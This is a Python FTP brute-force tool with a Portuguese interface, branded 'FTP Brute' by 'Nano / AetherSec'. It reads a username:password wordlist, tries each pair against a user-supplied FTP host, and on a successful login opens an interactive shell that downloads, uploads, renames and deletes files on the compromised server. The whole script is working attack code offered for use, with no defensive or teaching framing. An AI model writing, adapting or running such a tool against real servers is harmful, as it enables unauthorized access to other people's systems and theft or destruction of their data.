import os
import sys
import ftplib
import random
from time import sleep

if sys.platform == "linux":

	from signal import signal,SIGPIPE,SIG_DFL
	signal(SIGPIPE,SIG_DFL)

def banner():
	match sys.platform:
		case "linux":
			os.system("clear")
		case "win32":
			os.system("cls")
	print(f"""\033[1;34m

███████╗████████╗██████╗     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔════╝╚══██╔══╝██╔══██╗    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
█████╗     ██║   ██████╔╝    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
██╔══╝     ██║   ██╔═══╝     ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
██║        ██║   ██║         ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
╚═╝        ╚═╝   ╚═╝         ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝ (v 1.0)
              \033[m\033[1m>>> Leia o Manual:\033[m \033[1;32mdigite M <<<\033[m
		    \033[m\033[1m[\033[m\033[1;3{random.randint(1,6)}m+\033[m\033[1m]\033[m\033[1;3{random.randint(1,6)}m Coded by:\033[m \033[1;4mNano\033[m
		     \033[m\033[1;3{random.randint(1,6)}m ~~ AetherSec ~~\033[m
	""")

def Comandos():

	print("""
\033[1mComando [\033[m \033[1;32mLS\033[m \033[1m] - Para listar o diretório\033[m
\033[1mComando [\033[m \033[1;32mCD\033[m \033[1m] - Para entrar dentro de um diretório\033[m
\033[1mComando [\033[m \033[1;32mCL\033[m \033[1m] - Para limpar a tela\033[m
\033[1mComando [\033[m \033[1;32mPA\033[m \033[1m] - Para entrar no modo passivo\033[m
\033[1mComando [\033[m \033[1;32mCW\033[m \033[1m] - Para entrar direto no diretório\033[m
\033[1mComando [\033[m \033[1;32mDW\033[m \033[1m] - Para fazer o download de um arquivo\033[m
\033[1mComando [\033[m \033[1;32mUP\033[m \033[1m] - Para fazer o upload de um arquivo\033[m
\033[1mComando [\033[m \033[1;32mRN\033[m \033[1m] - Para renomear um arquivo no servidor\033[m
\033[1mComando [\033[m \033[1;32mEX\033[m \033[1m] - Para excluir arquivos do servidor\033[m
\033[1mComando [\033[m \033[1;32mMK\033[m \033[1m] - Para criar um diretório no servidor\033[m
\033[1mComando [\033[m \033[1;32mPW\033[m \033[1m] - Para retornar o caminho atual\033[m
\033[1mComando [\033[m \033[1;32mRM\033[m \033[1m] - Para remover um diretório\033[m
\033[1mComando [\033[m \033[1;32mQT\033[m \033[1m] - Para finalizar a conexão\033[m""")

def Manual():
	banner()
	print("""
\033[1;31m>>> O SCRIPT AINDA ESTÁ EM FASES DE TESTES!!!! <<<\033[m

EXEMPLO DE USO:

ftp.site.example.com ou apenas o IP (Não é necessário passar a porta)


OBS:

Caso o script feche do nada sem avisar o motivo (no linux) é porque teve inúmeras requisições
e isso será arrumado na próxima atualização
Mesma coisa no Windows (aqui é avisado o motivo)
		""")
	raise SystemExit

banner()

try:
	host = str(input("\033[1;34m>>>\033[m ")).strip()
except KeyboardInterrupt:
	raise SystemExit
except AttributeError:
	raise SystemExit
else:
	if host.lower() == "m":
		Manual()
	if host == "":
		raise SystemExit
logou = False
userlogin = False
userpassw = False
senhas = {
	"ftp":"ftp",
	"":"",
	"anonymous":"anonymous"}
print("\n\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Alvo:\033[m \033[1;32m>>>> {} <<<<\033[m\033[m".format(host))
print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Carregando wordlist...\033[m")
with open("ftptest1.txt","r") as arqpass:
	for x in arqpass:
		pw1 = x.replace("\n","")
		pw2 = pw1.split(":")
		try:
			senhas[pw2[0]] = pw2[1]
		except IndexError:
			senhas[pw2[0]] = ""
	arqpass.close()
print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Wordlist carregada!\033[m")
print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Iniciando o brute force...\033[m\n")
sleep(1)
try:
	ftp = ftplib.FTP(host=host)
except ftplib.socket.gaierror:
	print("\033[1m[\033[m\033[1;31mERROR\033[m\033[1m]\033[m\033[1m Insira um servidor!\033[m\n")
	raise SystemExit
except ConnectionRefusedError:
	print("\033[1m[\033[m\033[1;31mERROR\033[m\033[1m]\033[m\033[1m Conexão recusada pelo servidor!\033[m\n")
	raise SystemExit
except TimeoutError:
	print("\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Conexão encerrada porque o tempo de resposta foi excedido!\033[m\n")
	raise SystemExit
except KeyboardInterrupt:
	raise SystemExit
except BrokenPipeError:
	print("\n\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Muitas requisições em pouco tempo!\033[m\n")
	raise SystemExit
#tentando logar:
print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m ======================\033[m\033[1;34m TENTANDO FAZER LOGIN\033[m \033[1m======================\033[m \033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m\n\n")
for k,v in senhas.items():
	sleep(1)
	try:
		print("\033[1m[\033[m\033[1;36mLOGIN\033[m\033[1m]\033[m\033[1m Tentando com o user:\033[m \033[1;33m{}\033[m\033[1m e a senha:\033[m \033[1;33m{}\033[m".format(k,v))
		server = ftp.login(user=k,passwd=v)
	except ftplib.error_perm:
		print("\033[1m[\033[m\033[1;31mERROR\033[m\033[1m]\033[m\033[1m Username e Password incorrect!\033[m")
	except ftplib.socket.gaierror:
		print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Insira um servidor!\n\033[m")
		raise SystemExit
	except EOFError:
		continue
	except ConnectionAbortedError:
		print("\n\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Conexão abortada pelo host!\033[m\n")
		raise SystemExit
	except KeyboardInterrupt:
		raise SystemExit
	except BrokenPipeError:
		print("\n\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Muitas requisições em pouco tempo!\033[m\n")
		raise SystemExit
	else:
		if "230" in server:
			logou = True
			userlogin = k
			userpassw = v
			print("\n\033[1m[\033[m\033[1;32m >> LOGIN ENCONTRADO: <<\033[m\033[1m]\033[m\n")
			print("\033[1m[\033[m\033[1;32mACCEPT\033[m\033[1m]\033[m\033[1m User: {}\033[m".format(k))
			print("\033[1m[\033[m\033[1;32mACCEPT\033[m\033[1m]\033[m\033[1m Pass: {}\033[m".format(v))
			sleep(2)
			ftp.quit()
			break
		else:
			print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[ Conexão falhou...\033[m")
	sleep(0.10)

if logou:
	entrar = ftplib.FTP(host=host)
	entrar1 = entrar.login(user=userlogin,passwd=userpassw)
	banner()
	print("\033[1m[\033[m\033[1;32m OK! \033[m\033[1m]\033[m\033[1m Você conseguiu acesso ao servidor:\033[m \033[1;36m{}\033[m".format(host))
	print("\033[1m[\033[m\033[1;32m OK! \033[m\033[1m]\033[m\033[1m Digite C para ter acesso a shell!\033[m\n")
	while entrar:
		comando_user = str(input("\n\033[1;31mftp@ftpbrute~>\033[m ")).strip().lower()
		print()
		try:
			if comando_user == "c":
				Comandos()
			elif comando_user == "cd":
				directory = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do diretório:\033[m ")).strip()
				try:
					entrar.cwd(directory)
				except ftplib.error_perm:
					try:
						entrar.cwd(directory.lower())
					except ftplib.error_perm:
						entrar.cwd(directory.capitalize())
			elif comando_user == "ls":
				entrar.dir()
			elif comando_user == "pa":
				print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Modo passivo ativado!\033[m")
				entrar.set_pasv(True)
			elif comando_user == "cl":
				if sys.platform == "win32":
					os.system("cls")
					banner()
				elif sys.platform == "linux":
					os.system("clear")
					banner()
			elif comando_user == "qt":
				print("\033[1m[\033[m\033[1;32m+\033[m\033[1m]\033[m\033[1m Fechando conexão...\033[m")
				try:
					entrar.quit()
				except TimeoutError:
					raise SystemExit
				else:
					raise SystemExit
			elif comando_user == "dw":
				arquivo_download = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m \033[1mNome do arquivo a ser baixado:\033[m ")).strip()
				print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Tentando realizar o download...\033[m")
				try: 
					with open(arquivo_download,"wb") as arqs:
						entrar.retrbinary(f"RETR {arquivo_download}",arqs.write)
						arqs.close()
				except ftplib.all_errors:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m O arquivo pode ser um diretório ou sua permissão foi negada!\033[m")
				else:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo baixado!\033[m")
			elif comando_user == "rn":
				nome_arquivo_orign = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do arquivo: \033[m")).strip()
				nome_novo_arquivos = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Novo nome: \033[m")).strip()
				try:
					entrar.rename(fromname=nome_arquivo_orign,toname=nome_novo_arquivos)
				except ftplib.error_perm:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Alteração negada! Seu usuário não tem permissão...\033[m")
				else:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo alterado!\033[m")
			elif comando_user == "pw":
				print(entrar.pwd())
			elif comando_user == "cw":
				directory_enter = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do diretório: \033[m")).strip()
				entrar.cwd(directory_enter)
			elif comando_user == "ex":
				dirname = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do diretório/arquivo a ser removido: \033[m")).strip()
				try:
					entrar.rmd(dirname)
				except ftplib.error_perm:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Remoção negada! Seu usuário não tem permissão...\033[m")
				else:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo\033[m \033[1;33m{}\033[m removido!\033[m".format(dirname))
			elif comando_user == "mk":
				dirname_create = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do diretório a ser criado: \033[m")).strip()
				try:
					entrar.mkd(dirname_create)
				except ftplib.error_perm:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Criação negada! Seu usuário não tem permissão...\033[m")
				else:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo criado!\033[m")
			elif comando_user == "rm":
				dirname_2 = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do arquivo: \033[m")).strip()
				try:
					entrar.delete(dirname_2)
				except ftplib.error_perm:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Remoção negada! Seu usuário não tem permissão...\033[m")
				else:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo\033[m \033[1;33m{}\033[m removido!\033[m".format(dirname))
			elif comando_user == "up":
				nome_arquivo_upload = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do arquivo: \033[m")).strip()
				try:
					with open(nome_arquivo_upload,"rb") as uploads:
						entrar.storbinary(f"STOR {nome_arquivo_upload}",uploads)
					uploads.close()
				except FileNotFoundError:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Arquivo não encontrado!\033[m")
				except PermissionError:
					pass
				except ftplib.error_perm:
					print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Upload negado! Seu usuário não tem permissão...\033[m")
				else:
					print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo enviado!\033[m")
			elif comando_user == "ld":
				print(entrar.mlsd())
		except TimeoutError:
			print("\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Conexão encerrada porque o tempo de resposta foi excedido!\033[m\n")
			entrar.quit()
			raise SystemExit
		except KeyboardInterrupt:
			raise SystemExit
else:
	print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Nenhuma senha encontrada para esse servidor...\n")
